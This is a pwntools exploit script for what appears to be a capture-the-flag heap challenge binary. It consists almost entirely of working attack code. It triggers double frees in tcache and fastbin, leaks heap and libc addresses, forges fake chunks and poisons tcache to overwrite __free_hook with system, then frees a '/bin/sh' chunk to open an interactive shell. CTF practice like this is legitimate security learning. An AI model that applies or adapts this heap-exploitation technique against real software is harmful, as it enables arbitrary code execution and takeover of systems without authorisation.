from pwn import *

io = process("./chall")


def add(len,data):
    io.sendlineafter("Choice >> ","1")
    io.sendlineafter("Enter length : ",str(len))
    io.sendlineafter("Enter data : ",data)

def remove(idx,off,leak='n'):
    io.sendlineafter("Choice >> ","2")
    io.sendlineafter("Enter index: ",str(idx))
    if(leak=='n'):
        io.sendlineafter("Which one?(1337 for all) ",str(off))
    else:
        leak = io.recvline()
        io.sendlineafter("Which one?(1337 for all) ",str(off))
        return leak.strip()

def link(to,fr):
    io.sendlineafter("Choice >> ","3")
    io.sendlineafter("Enter to index: ",str(to))
    io.sendlineafter("Enter from index: ",str(fr))

def unlink(idx,off,choice="y"):
    io.sendlineafter("Choice >> ","4")
    io.sendlineafter("Enter index: ",str(idx))
    io.sendlineafter("Enter offset: ",str(off))
    io.sendlineafter("Do you want to keep it (y/n)? ",choice)



for i in range(10):
    add(0x30,"a")

link(1,2)
link(1,0)          # 0 -> 1 -> 2

for i in range(7):
    remove(9-i,1)       # filling tcache

unlink(1,2)        # 0 with two chunks and 1 with one chunk
remove(1,2)
remove(0,1337)     # double free in fastbin

## 1 is not free

for i in range(7):            # freeing up tcache
    add(0x30,"aaaa")          # 0, 2 to 7

## 8, 9 free

add(0x30,"a"*16)          # 8
#link(8,0)                

remove(8,1)       # double free in tcache

for i in range(6):     # free up space in the global array
    remove(2+i,1)
#remove(1,1)

#for i in range(2):
add(0x10,"1111")      # remove 2 chunks from tcache
add(0x20,"1111")      # remove 1 chunk from 0x10 tcache

add(0x10,"")          # set the fd's last bit as null making it point to an already allocated chunk
add(0x20,"1111")      # remove one more 0x10 chunk
add(0x10,"")          # this will make buf pointer in two places in the array
remove(6,1)           # free in one place and view in other place to get heap leak
remove(0,1)           # to avoid double free error in fastbin

heap = u64(remove(1,1,'y')[-6:]+"\x00\x00")-0x5f0
log.info("Heap @ "+str(hex(heap)))

# Cleanup global array
for i in range(4):
    remove(2+i,1)


#for i in range(5):
#    add(0x30,chr(ord('f')+i)*16)


payload = p64(0)*3  +p64(0x21)

add(0x30,payload)     # fake next chunk   # 0 this will be made into a unsorted bin

payload = p64(0)*3  +p64(0x61)

add(0x30,payload)     # fake chunk        # 1
add(0x30,"aaa")       # random            # 2

addr = heap + 0x4a0

add(0x30,p64(addr))        # fd overwrite      # 3


add(0x30,"aaa")       # random          # 4
add(0x30,"aaa")       # random          # 5
add(0x30,"--------")       # random          # 6

remove(6,1)

payload = p64(0)*3 + p64(0x21) + p64(0) + p64(0x30) + p64(heap+0x4e0) + p64(0x431)
add(0x50,payload)           # 6

for i in range(3):
    remove(i+2,1)

for i in range(3):
    add(0x60,"aaaa")

remove(2,1)
remove(3,1)

add(0x50,"cccc")        # 2
add(0x50,"cccc")        # 3

remove(2,1)
remove(3,1)


payload = p64(0)*7 + p64(0x61)

add(0x41,payload) # 2
add(0x40,"aaaa")          # 3

# cleanup
remove(0,1)
remove(1,1)
remove(4,1)
remove(6,1)

# removing 0x10 chunk from tcache so chunk above unsorted chunk is on top
add(0x10,"aaaa")   # 1
add(0x20,"aaaa")   # 2

add(0x40,"aaaa")  # 4 - leaker chunk

remove(2,1)
# edit the buf pointer to point to libc address
payload = p64(0)*3 + p64(0x21) + p64(0) + p64(0x40) + p64(heap+0x530)
add(0x50,payload)           # 2
# leaking

link(4,0)

# Getting libc leak
io.sendlineafter("Choice >> ","4")
io.sendlineafter("Enter index: ","4")
libc = u64(io.recvline().strip()[-6:]+"\x00\x00")-0x1ebbe0
io.sendlineafter("Enter offset: ","1")
io.sendlineafter("Do you want to keep it (y/n)? ","y")
log.info("Libc @ "+str(hex(libc)))

remove(2,1)
payload = p64(0)*3 + p64(0x21) + p64(0) + p64(0x40) + p64(heap+0x4e0) + "\x51"
add(0x50,payload)           # 2

link(3,4)
link(3,0)
unlink(3,2,"y")   # free 3's 2nd offset and 0's 1337 to get the error
link(5,3)
unlink(5,2,"y") # 0 and 3 1337 free and 5th 2nd offset

remove(5,2)
remove(2,1)
# freeing tcache thrice. Setting cookie to null
payload = p64(0)*3 + p64(0x21) + p64(0) + p64(0x40) + p64(heap+0x4e0) + p64(0x51) + p64(0)*2
add(0x51,payload)           # 2

remove(0,1337)
remove(2,1)
# setting cookie null again
payload = p64(0)*3 + p64(0x21) + p64(0) + p64(0x40) + p64(heap+0x4e0) + p64(0x51) + p64(0)*2
add(0x51,payload)           # 0

# same chunk several times in tcache
remove(3,1337)

hook = libc + 0x1eeb28
system = libc + 0x55410

# changing fd to __free_hook
add(0x40,p64(hook)) # 2
add(0x40,"bbbbbbbb") # 3

# setting fd of 0x10 chunk so it won't cause error
link(2,3)

# This chunk will be used to call system
add(0x40,"/bin/sh\x00") # 3

# overwriting __free_hook with system
add(0x40,p64(system))
# triggering system
remove(3,1)

#gdb.attach(io)
io.interactive()
